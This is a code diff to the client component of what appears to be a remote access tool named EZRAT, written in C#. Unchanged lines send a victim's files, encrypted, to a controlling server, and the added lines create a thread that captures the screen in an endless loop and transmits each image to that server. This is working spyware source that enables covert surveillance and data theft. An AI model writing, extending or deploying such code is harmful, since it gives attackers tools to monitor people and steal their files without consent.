@@ -6,6 +6,8 @@ using System.Linq;
 using System.Text;
 using System.Runtime.InteropServices;
 using EZRATClient.Utils;
+using System.Threading;
+using System.Drawing.Imaging;
 
 namespace EZRATClient.Core
 {
@@ -44,7 +46,7 @@ namespace EZRATClient.Core
             {
                 //_clientSocket.SendFile(path); //Send the data to the server
                 string dataFile = string.Empty;
-                File.ReadAllBytes(path).ToList().ForEach( (b) => { dataFile += b.ToString() + Constantes.Separator; });
+                File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
                 byte[] result = Encoding.Default.GetBytes(Program.Encrypt("dlfile;" + dataFile));
                 Program._clientSocket.Send(result);
             }
@@ -65,5 +67,40 @@ namespace EZRATClient.Core
             proc.StartInfo = procStartInfo;
             proc.Start();
         }
+
+
+        // For futur use
+        public static Thread ScreenSpyThread()
+        {
+            Constantes.Spy = new Thread(() =>
+           {
+               while (true)
+               {
+                   string tmp = "screenspy;" + TakeScreenShot();
+                   Program.SendCommand(tmp);
+                   Thread.Sleep(Constantes.ScreenShotSpeed);
+               }
+           });
+            Constantes.Spy.Start();
+            return Constantes.Spy;
+        }
+
+        public static void StopScreenSpyThread()
+        {
+            Constantes.Spy.Abort();
+        }
+
+        public static string TakeScreenShot()
+        {
+            string result = null;
+            using (MemoryStream ms = new MemoryStream())
+            {
+                ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
+                result = Encoding.Default.GetString(ms.ToArray());
+            }
+            return result;
+        }
+
+
     }
 }
